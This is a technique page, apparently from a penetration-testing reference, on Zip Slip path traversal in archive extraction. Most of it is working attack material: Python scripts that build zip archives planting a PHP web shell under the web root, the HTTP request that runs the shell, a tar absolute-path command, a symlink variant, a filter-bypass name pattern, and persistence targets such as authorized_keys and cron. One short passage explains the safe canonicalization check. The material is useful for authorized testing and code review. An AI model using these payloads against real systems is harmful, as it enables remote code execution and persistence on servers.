---
title: "Zip Slip: path traversal through archive extraction"
description: "Archive entries with traversal sequences or absolute paths write outside the unpack directory during extraction, overwriting web assets or binaries and planting shells."
keywords:
  - zip slip
  - archive extraction
  - path traversal
  - arbitrary file write
  - symlink
  - tar
---

# Zip Slip

When an application unpacks an uploaded archive without resolving each entry's final path, an entry named with traversal sequences or an absolute path is written **outside** the intended extraction directory. The attacker chooses where bytes land: a web-served script, a binary on the `PATH`, a cron file, or a config the service reads.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess.

## The flawed pattern

Vulnerable extractors join the destination directory with the raw entry name and never check the result stays inside the destination. In Java, `ZipInputStream` hands back `entry.getName()` verbatim:

```java
ZipEntry entry = zis.getNextEntry();
File out = new File(destDir, entry.getName());   // "../" is honored
FileOutputStream fos = new FileOutputStream(out); // writes outside destDir
```

Because `new File(destDir, "../../x")` resolves above `destDir`, the write escapes. Safe code canonicalizes `out.getCanonicalPath()` and confirms it starts with the canonical `destDir`, which is exactly what the flawed path omits.

## Crafting a traversal entry

Archive formats store the entry name as a plain string, so traversal sequences go straight in. Build a zip whose member name climbs out and lands on a web-served file:

```python
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../../var/www/html/shell.php',
               '<?php system($_GET["c"]); ?>')
```

On extraction the shell is written under the web root. Request it to execute:

```
GET /shell.php?c=id HTTP/1.1
```

## Absolute paths

Some archivers (older `tar`, and zip libraries that do not strip a leading slash) honor an absolute member name, dropping the relative/traversal dance:

```bash
# tar entry with an absolute path
tar -cf evil.tar -C / -P /var/www/html/shell.php
```

GNU tar needs `-P`/`--absolute-names` to create and to extract such a member, which some server-side wrappers pass by default.

## High-value write targets

With arbitrary write, pick a path that yields execution or persistence:

- `/var/www/html/shell.php` or the app's static dir, for a web shell.
- `~/.ssh/authorized_keys`, to add a key.
- A cron drop such as `/etc/cron.d/x` for scheduled command execution.
- An existing binary or script on the service `PATH`, to hijack the next run.
- Overwriting application JARs, `.env`, or templates the process reloads.

## Symlink variant

A second class abuses symbolic links inside the archive: a symlink entry pointing at a directory outside the unpack root, followed by a regular entry **beneath** that link, so the write lands at the link target. The two entries must be preserved in order, which a double `zip` add does not do (it updates the existing member), so build the archive with a tool that keeps ordered entries:

```python
import zipfile
z = zipfile.ZipFile("evil.zip", "w")
# 1) a symlink entry 'evil' -> /var/www/html
info = zipfile.ZipInfo("evil"); info.external_attr = (0o120777) << 16
z.writestr(info, "/var/www/html")
# 2) a regular entry written through it
z.writestr("evil/shell.php", "<?php system($_GET['c']); ?>")
z.close()
```

On extractors that recreate the symlink before writing later members, `evil/shell.php` is written through the link into `/var/www/html`. Read-oriented variants point the symlink at `/etc/passwd` so a later preview or re-download of the archived path returns the link target's contents.

## Nested and mixed archives

Deeply prefixed names (`....//....//`) defeat naive single-pass `../` stripping, because removing one `../` leaves another valid sequence:

```
....//....//....//var/www/html/shell.php
```

The same entry names work across zip, tar, jar, war, and many language-specific unpackers, since the flaw is in the extraction code, not the format.

## References

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings: Zip Slip](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [Snyk Zip Slip research](https://security.snyk.io/research/zip-slip-vulnerability)
